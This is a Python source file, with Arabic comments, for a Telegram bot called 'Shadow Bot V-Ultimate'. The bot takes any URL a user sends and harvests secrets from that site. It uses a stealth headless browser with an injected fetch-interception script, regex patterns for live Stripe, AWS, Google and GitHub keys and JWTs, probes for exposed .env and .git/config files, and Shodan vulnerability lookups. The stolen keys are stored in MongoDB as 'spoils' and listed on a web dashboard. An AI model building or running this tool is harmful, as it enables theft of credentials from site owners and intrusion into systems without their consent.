import os, re, threading, socket, shodan, jsbeautifier, httpx, time, requests
from flask import Flask, render_template
from playwright.sync_api import sync_playwright
from playwright_stealth import stealth_sync
from pymongo import MongoClient
import telebot

# --- الإعدادات السيادية (Environment Variables) ---
TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
SHODAN_KEY = os.getenv("SHODAN_API")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
shodan_api = shodan.Shodan(SHODAN_KEY)
client = MongoClient(MONGO_URI)
db = client['ShadowDB']['Intelligence']

# --- محركات البحث والاستخراج ---

def get_shodan_intel(url):
    try:
        domain = url.split("//")[-1].split("/")[0]
        ip = socket.gethostbyname(domain)
        host = shodan_api.host(ip)
        return f"📍 IP: `{ip}`\n🛠 OS: `{host.get('os', 'N/A')}`\n🚪 Ports: `{host.get('ports')}`\n⚠️ Vulns: `{host.get('vulns', [])[:3]}`"
    except: return "❌ فشل في جلب بيانات Shodan."

def deep_scan(url):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(user_agent="Mozilla/5.0...")
        page = context.new_page()
        stealth_sync(page)
        # حقن سكريبت لاعتراض طلبات الـ API
        page.add_init_script("window._logs = []; const orgFetch = window.fetch; window.fetch = function() { window._logs.push(arguments[0]); return orgFetch.apply(this, arguments); };")
        try:
            page.goto(url, wait_until="networkidle", timeout=60000)
            content = jsbeautifier.beautify(page.content())
            # البحث عن مفاتيح API (Stripe, AWS, Firebase, JWT)
            patterns = r"(?:pk_live|sk_live|AKIA|AIza|ghp_|eyJ)[0-9a-zA-Z\-_\.]{16,}"
            found = list(set(re.findall(patterns, content)))
            intercepted = page.evaluate("window._logs")
            return {"secrets": found, "apis": intercepted[:5]}
        except: return {"secrets": [], "apis": []}
        finally: browser.close()

def find_hidden_files(url):
    paths = [".env", "swagger.json", ".git/config", "config.php"]
    found = []
    for p in paths:
        try:
            r = httpx.get(f"{url.rstrip('/')}/{p}", timeout=5)
            if r.status_code == 200: found.append(f"🔓 `{p}`")
        except: pass
    return found

# --- أوامر التحكم في البوت ---

@bot.message_handler(commands=['start'])
def welcome(m):
    menu = (
        "🕵️‍♂️ **Shadow Bot V-Ultimate**\n\n"
        "الأوامر:\n"
        "1️⃣ ارسل رابط مباشرة: للفحص الشامل (صيد تلقائي).\n"
        "2️⃣ `/intel [رابط]`: رادار السيرفر (Shodan).\n"
        "3️⃣ `/fuzz [رابط]`: صائد الملفات الحساسة.\n"
        "4️⃣ `/logs`: عرض آخر الغنائم من السحابة."
    )
    bot.reply_to(m, menu, parse_mode="Markdown")

@bot.message_handler(commands=['intel'])
def cmd_intel(m):
    url = m.text.split(" ")[-1]
    if "http" in url:
        bot.reply_to(m, f"📡 **جاري فحص السيرفر...**\n\n{get_shodan_intel(url)}", parse_mode="Markdown")
    else: bot.reply_to(m, "⚠️ يرجى إرسال الرابط بعد الأمر.")

@bot.message_handler(commands=['fuzz'])
def cmd_fuzz(m):
    url = m.text.split(" ")[-1]
    if "http" in url:
        bot.reply_to(m, "📂 **جاري البحث عن ملفات مكشوفة...**")
        res = find_hidden_files(url)
        bot.send_message(m.chat.id, "✅ النتائج:\n" + ("\n".join(res) if res else "لم يتم العثور على شيء."))

@bot.message_handler(commands=['logs'])
def cmd_logs(m):
    data = list(db.find().sort("_id", -1).limit(10))
    res = "📜 **آخر الغنائم:**\n" + "\n".join([f"🌐 {d['target']} -> `{d['content'][:20]}...`" for d in data])
    bot.reply_to(m, res, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text.startswith("http"))
def full_hunt(m):
    bot.reply_to(m, "🚀 **بدء مهمة التسلل الشاملة...**")
    data = deep_scan(m.text)
    for s in data['secrets']:
        db.insert_one({"target": m.text, "content": s})
    
    report = f"✅ **اكتمل الفحص لـ:** {m.text}\n🔑 المفاتيح المكتشفة: `{len(data['secrets'])}`"
    if data['apis']: report += "\n📡 واجهات API المكتشفة: " + str(len(data['apis']))
    bot.send_message(m.chat.id, report, parse_mode="Markdown")

# --- لوحة التحكم ونظام البقاء نشطاً ---

@app.route('/')
def dashboard():
    leaks = list(db.find().sort("_id", -1))
    return render_template('index.html', leaks=leaks)

def keep_alive():
    while True:
        try: requests.get(f"https://{os.getenv('RENDER_EXTERNAL_HOSTNAME')}")
        except: pass
        time.sleep(600)

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))).start()
    threading.Thread(target=keep_alive).start()
    bot.polling(none_stop=True)
